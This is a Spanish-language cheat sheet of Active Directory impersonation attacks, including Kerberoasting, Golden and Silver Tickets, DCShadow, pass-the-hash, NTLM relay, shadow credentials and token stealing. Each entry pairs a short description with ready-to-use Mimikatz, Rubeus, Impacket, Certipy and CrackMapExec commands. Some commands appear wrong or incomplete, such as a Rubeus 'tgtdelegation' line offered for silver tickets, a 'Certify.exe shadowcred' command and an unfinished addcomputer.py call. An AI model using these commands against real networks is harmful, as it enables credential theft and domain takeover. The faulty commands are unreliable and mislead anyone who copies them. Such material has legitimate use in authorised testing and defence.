# Técnicas de Suplantación/Impersonation en Active Directory – Comandos y Herramientas

---

## Índice de Técnicas

1. [AS-REP Roasting](#1-as-rep-roasting)
2. [Certificate-Based Impersonation (ADCS Abuse)](#2-certificate-based-impersonation-adcs-abuse)
3. [DCShadow Attack](#3-dcshadow-attack)
4. [Golden Ticket Attack](#4-golden-ticket-attack)
5. [Kerberoasting](#5-kerberoasting)
6. [Kerberos Constrained Delegation (KCD) Abuse](#6-kerberos-constrained-delegation-kcd-abuse)
7. [Kerberos Unconstrained Delegation](#7-kerberos-unconstrained-delegation)
8. [Lateral Movement via SMB/Token/Ticket](#8-lateral-movement-via-smbtokenticket)
9. [MSSQL Impersonation (EXECUTE AS)](#9-mssql-impersonation-execute-as)
10. [NTLM/SMB Relay](#10-ntlmsmb-relay)
11. [Overpass-the-Certificate (Pass-the-Cert)](#11-overpass-the-certificate-pass-the-cert)
12. [Overpass-the-Hash (OpTH)](#12-overpass-the-hash-opth)
13. [Pass-the-Hash (PtH)](#13-pass-the-hash-pth)
14. [Pass-the-Key (PTK)](#14-pass-the-key-ptk)
15. [Pass-the-Ticket (PtT)](#15-pass-the-ticket-ptt)
16. [Resource-Based Constrained Delegation (RBCD)](#16-resource-based-constrained-delegation-rbcd)
17. [S4U (Service-for-User) Delegation Abuse](#17-s4u-service-for-user-delegation-abuse)
18. [Shadow Credentials](#18-shadow-credentials)
19. [SID History Injection](#19-sid-history-injection)
20. [Silver Ticket Attack](#20-silver-ticket-attack)
21. [Token Impersonation & Token Stealing](#21-token-impersonation--token-stealing)

---

## 1. AS-REP Roasting

| Aspecto         | Detalle                                                                                  |
|-----------------|-----------------------------------------------------------------------------------------|
| **Descripción** | Solicita tickets AS-REP de cuentas sin preautenticación y crackea el hash offline.      |
| **Condiciones** | Cuenta con preauth deshabilitado                                                        |

**Herramientas y comandos:**

- **Windows:**  
  - **Rubeus:**  
    ```powershell
    Rubeus.exe asreproast
    ```
- **Linux:**  
  - **Impacket/GetNPUsers.py:**  
    ```bash
    python3 GetNPUsers.py -no-pass -dc-ip <DC-IP> <DOMAIN>/
    ```

[Volver al índice](#índice-de-técnicas)

---

## 2. Certificate-Based Impersonation (ADCS Abuse)

| Aspecto         | Detalle                                                                                          |
|-----------------|-------------------------------------------------------------------------------------------------|
| **Descripción** | Solicita un certificado abusando de una plantilla vulnerable para autenticarse como otro usuario.|
| **Condiciones** | CA (ADCS) mal configurada o plantilla vulnerable.                                               |

**Herramientas y comandos:**

- **Windows:**  
  - **Certify:**  
    ```powershell
    Certify.exe request /ca:<CA> /template:<Template> /altname:user@dominio.local
    ```
- **Linux:**  
  - **Certipy:**  
    ```bash
    certipy req -u <user> -p <pass> -ca <CA> -template <Template>
    ```

[Volver al índice](#índice-de-técnicas)

---

## 3. DCShadow Attack

| Aspecto         | Detalle                                                                                  |
|-----------------|-----------------------------------------------------------------------------------------|
| **Descripción** | Replica cambios maliciosos en AD usando un DC falso.                                    |
| **Condiciones** | Privilegios Domain Admin y acceso a red interna.                                        |

**Herramientas y comandos:**

- **Windows:**  
  - **Mimikatz:**  
    ```powershell
    mimikatz # lsadump::dcshadow /object:<usuario> /attribute:unicodePwd /value:<hash>
    ```

[Volver al índice](#índice-de-técnicas)

---

## 4. Golden Ticket Attack

| Aspecto         | Detalle                                                                                          |
|-----------------|-------------------------------------------------------------------------------------------------|
| **Descripción** | Crea un TGT falso usando el hash de KRBTGT.                                                     |
| **Condiciones** | Hash KRBTGT (Domain Admin)                                                                      |

**Herramientas y comandos:**

- **Windows:**  
  - **Mimikatz:**  
    ```powershell
    mimikatz # kerberos::golden /user:Administrator /domain:<DOMINIO> /sid:<SID> /krbtgt:<HASH> /ptt
    ```
- **Linux:**  
  - **Impacket/ticketer.py:**  
    ```bash
    python3 ticketer.py -nthash <KRBTGT_HASH> -domain-sid <SID> <USER>@<DOMAIN>
    ```

[Volver al índice](#índice-de-técnicas)

---

## 5. Kerberoasting

| Aspecto         | Detalle                                                                                  |
|-----------------|-----------------------------------------------------------------------------------------|
| **Descripción** | Solicita TGS de cuentas de servicio (SPN) y crackea el hash offline.                    |
| **Condiciones** | Cuenta de servicio con SPN y contraseña débil.                                          |

**Herramientas y comandos:**

- **Windows:**  
  - **Rubeus:**  
    ```powershell
    Rubeus.exe kerberoast
    ```
- **Linux:**  
  - **Impacket/GetUserSPNs.py:**  
    ```bash
    python3 GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC-IP> -request
    ```

[Volver al índice](#índice-de-técnicas)

---

## 6. Kerberos Constrained Delegation (KCD) Abuse

| Aspecto         | Detalle                                                                                  |
|-----------------|-----------------------------------------------------------------------------------------|
| **Descripción** | Solicita TGS en nombre de cualquier usuario a servicios concretos si controlas cuenta.  |
| **Condiciones** | Control sobre cuenta/máquina con KCD.                                                   |

**Herramientas y comandos:**

- **Windows:**  
  - **Rubeus:**  
    ```powershell
    Rubeus.exe s4u /user:<USER> /rc4:<HASH> /impersonateuser:<TARGET> /msdsspn:<SPN> /ptt
    ```

[Volver al índice](#índice-de-técnicas)

---

## 7. Kerberos Unconstrained Delegation

| Aspecto         | Detalle                                                                                  |
|-----------------|-----------------------------------------------------------------------------------------|
| **Descripción** | Extrae TGTs de usuarios que se conectan a un host vulnerable.                           |
| **Condiciones** | Control sobre host con unconstrained delegation.                                        |

**Herramientas y comandos:**

- **Windows:**  
  - **Mimikatz:**  
    ```powershell
    mimikatz # sekurlsa::tickets /export
    ```

[Volver al índice](#índice-de-técnicas)

---

## 8. Lateral Movement via SMB/Token/Ticket

| Aspecto         | Detalle                                                                                  |
|-----------------|-----------------------------------------------------------------------------------------|
| **Descripción** | Movimiento lateral usando hashes, tickets o tokens.                                     |
| **Condiciones** | Hash/ticket/token válido y acceso remoto (SMB/WinRM habilitado).                        |

**Herramientas y comandos:**

- **Windows:**  
  - **Mimikatz:**  
    ```powershell
    mimikatz # sekurlsa::pth /user:<USER> /domain:<DOMINIO> /ntlm:<HASH>
    ```
- **Linux:**  
  - **CrackMapExec:**  
    ```bash
    crackmapexec smb <IP> -u <user> -H <NTLM>
    ```

[Volver al índice](#índice-de-técnicas)

---

## 9. MSSQL Impersonation (EXECUTE AS)

| Aspecto         | Detalle                                                                                  |
|-----------------|-----------------------------------------------------------------------------------------|
| **Descripción** | Toma la identidad de otro usuario en SQL Server mediante EXECUTE AS.                    |
| **Condiciones** | Permiso EXECUTE AS o CONTROL en SQL Server.                                             |

**Herramientas y comandos:**

- **Windows:**  
  - **SSMS:**  
    ```sql
    EXECUTE AS USER = 'sa';
    ```
- **Linux:**  
  - **Impacket/mssqlclient.py:**  
    ```sql
    EXECUTE AS USER = 'sa';  -- dentro de la shell interactiva
    ```

[Volver al índice](#índice-de-técnicas)

---

## 10. NTLM/SMB Relay

| Aspecto         | Detalle                                                                                  |
|-----------------|-----------------------------------------------------------------------------------------|
| **Descripción** | Relay de autenticaciones NTLM capturadas para acceso con privilegios del usuario.       |
| **Condiciones** | SMB signing deshabilitado.                                                              |

**Herramientas y comandos:**

- **Linux:**  
  - **ntlmrelayx.py (Impacket):**  
    ```bash
    python3 ntlmrelayx.py -t smb://<target-IP>
    ```
  - **Responder:**  
    ```bash
    sudo responder -I <interface>
    ```

[Volver al índice](#índice-de-técnicas)

---

## 11. Overpass-the-Certificate (Pass-the-Cert)

| Aspecto         | Detalle                                                                                  |
|-----------------|-----------------------------------------------------------------------------------------|
| **Descripción** | Usa un certificado válido/exportable para solicitar TGT Kerberos.                       |
| **Condiciones** | Certificado válido exportable.                                                          |

**Herramientas y comandos:**

- **Windows:**  
  - **Rubeus:**  
    ```powershell
    Rubeus.exe asktgt /user:<user> /certificate:<.pfx> /password:<pfx_pass>
    ```

[Volver al índice](#índice-de-técnicas)

---

## 12. Overpass-the-Hash (OpTH)

| Aspecto         | Detalle                                                                                  |
|-----------------|-----------------------------------------------------------------------------------------|
| **Descripción** | Usa un hash NTLM para solicitar TGT Kerberos.                                           |
| **Condiciones** | Hash NTLM válido.                                                                       |

**Herramientas y comandos:**

- **Windows:**  
  - **Rubeus:**  
    ```powershell
    Rubeus.exe asktgt /user:<user> /rc4:<hash>
    ```
  - **Mimikatz:**  
    ```powershell
    mimikatz # sekurlsa::pth /user:<USER> /domain:<DOMINIO> /ntlm:<HASH>
    ```

[Volver al índice](#índice-de-técnicas)

---

## 13. Pass-the-Hash (PtH)

| Aspecto         | Detalle                                                                                  |
|-----------------|-----------------------------------------------------------------------------------------|
| **Descripción** | Usa el hash NTLM para autenticarse sin contraseña.                                      |
| **Condiciones** | Hash NTLM válido, SMB/WinRM habilitado.                                                 |

**Herramientas y comandos:**

- **Windows:**  
  - **Mimikatz:**  
    ```powershell
    mimikatz # sekurlsa::pth /user:<USER> /domain:<DOMINIO> /ntlm:<HASH>
    ```
- **Linux:**  
  - **CrackMapExec:**  
    ```bash
    crackmapexec smb <IP> -u <user> -H <NTLM>
    ```

[Volver al índice](#índice-de-técnicas)

---

## 14. Pass-the-Key (PTK)

| Aspecto         | Detalle                                                                                  |
|-----------------|-----------------------------------------------------------------------------------------|
| **Descripción** | Usa claves AES de Kerberos para generar tickets.                                        |
| **Condiciones** | Claves AES en memoria.                                                                  |

**Herramientas y comandos:**

- **Windows:**  
  - **Mimikatz:**  
    ```powershell
    mimikatz # kerberos::ptk /user:<USER> /aes256:<AES>
    ```

[Volver al índice](#índice-de-técnicas)

---

## 15. Pass-the-Ticket (PtT)

| Aspecto         | Detalle                                                                                  |
|-----------------|-----------------------------------------------------------------------------------------|
| **Descripción** | Inyecta un ticket Kerberos (.kirbi) robado/generado para acceso.                        |
| **Condiciones** | Ticket válido (.kirbi).                                                                 |

**Herramientas y comandos:**

- **Windows:**  
  - **Mimikatz:**  
    ```powershell
    mimikatz # kerberos::ptt <ticket.kirbi>
    ```
  - **Rubeus:**  
    ```powershell
    Rubeus.exe ptt /ticket:<ticket.kirbi>
    ```

[Volver al índice](#índice-de-técnicas)

---

## 16. Resource-Based Constrained Delegation (RBCD)

| Aspecto         | Detalle                                                                                  |
|-----------------|-----------------------------------------------------------------------------------------|
| **Descripción** | Modifica RBCD para que tu máquina actúe por otros usuarios en recursos específicos.      |
| **Condiciones** | Permiso sobre atributo msDS-AllowedToActOnBehalfOfOtherIdentity.                        |

**Herramientas y comandos:**

- **Windows:**  
  - **PowerView (PowerShell):**  
    ```powershell
    Set-ADComputer -Identity <target> -PrincipalsAllowedToDelegateToAccount <computer>
    ```
- **Linux:**  
  - **addcomputer.py (Impacket):**  
    ```bash
    python3 addcomputer.py ...
    ```

[Volver al índice](#índice-de-técnicas)

---

## 17. S4U (Service-for-User) Delegation Abuse

| Aspecto         | Detalle                                                                                  |
|-----------------|-----------------------------------------------------------------------------------------|
| **Descripción** | Abusa de S4U2Self/S4U2Proxy para obtener tickets de otros usuarios.                     |
| **Condiciones** | Control de cuenta delegada.                                                             |

**Herramientas y comandos:**

- **Windows:**  
  - **Rubeus:**  
    ```powershell
    Rubeus.exe s4u /user:<USER> /rc4:<HASH> /impersonateuser:<TARGET> /msdsspn:<SPN> /ptt
    ```

[Volver al índice](#índice-de-técnicas)

---

## 18. Shadow Credentials

| Aspecto         | Detalle                                                                                  |
|-----------------|-----------------------------------------------------------------------------------------|
| **Descripción** | Agrega clave a objeto AD para obtener TGT con certificados.                             |
| **Condiciones** | Permiso de escritura sobre objeto AD.                                                   |

**Herramientas y comandos:**

- **Windows:**  
  - **Whisker:**  
    ```powershell
    Whisker.exe add /target:<user>
    ```
  - **Certify:**  
    ```powershell
    Certify.exe shadowcred /target:<user>
    ```

[Volver al índice](#índice-de-técnicas)

---

## 19. SID History Injection

| Aspecto         | Detalle                                                                                  |
|-----------------|-----------------------------------------------------------------------------------------|
| **Descripción** | Inyecta SIDs históricos en un usuario para heredar permisos.                            |
| **Condiciones** | Privilegios Domain Admin.                                                               |

**Herramientas y comandos:**

- **Windows:**  
  - **Mimikatz:**  
    ```powershell
    mimikatz # sid::patch
    # Luego modificar el atributo SIDHistory del usuario
    ```

[Volver al índice](#índice-de-técnicas)

---

## 20. Silver Ticket Attack

| Aspecto         | Detalle                                                                                  |
|-----------------|-----------------------------------------------------------------------------------------|
| **Descripción** | Crea TGS falso para un servicio usando el hash NT de la cuenta de servicio.             |
| **Condiciones** | Hash NT de cuenta de servicio y SPN.                                                    |

**Herramientas y comandos:**

- **Windows:**  
  - **Mimikatz:**  
    ```powershell
    mimikatz # kerberos::golden /user:<USER> /domain:<DOMINIO> /sid:<SID> /service:<SPN> /target:<host> /rc4:<HASH> /ptt
    ```
  - **Rubeus:**  
    ```powershell
    Rubeus.exe tgtdelegation /user:<USER> /rc4:<HASH> /domain:<DOMINIO> /sid:<SID> /service:<SPN>
    ```

[Volver al índice](#índice-de-técnicas)

---

## 21. Token Impersonation & Token Stealing

| Aspecto         | Detalle                                                                                  |
|-----------------|-----------------------------------------------------------------------------------------|
| **Descripción** | Roba/duplica tokens de acceso de otros usuarios para ejecutar procesos bajo su identidad.|
| **Condiciones** | Privilegios elevados, acceso local.                                                     |

**Herramientas y comandos:**

- **Windows:**  
  - **Mimikatz:**  
    ```powershell
    mimikatz # token::elevate
    mimikatz # token::list
    ```
  - **Incognito:**  
    ```powershell
    incognito.exe -a "AddUser <token>"
    ```

[Volver al índice](#índice-de-técnicas)

---
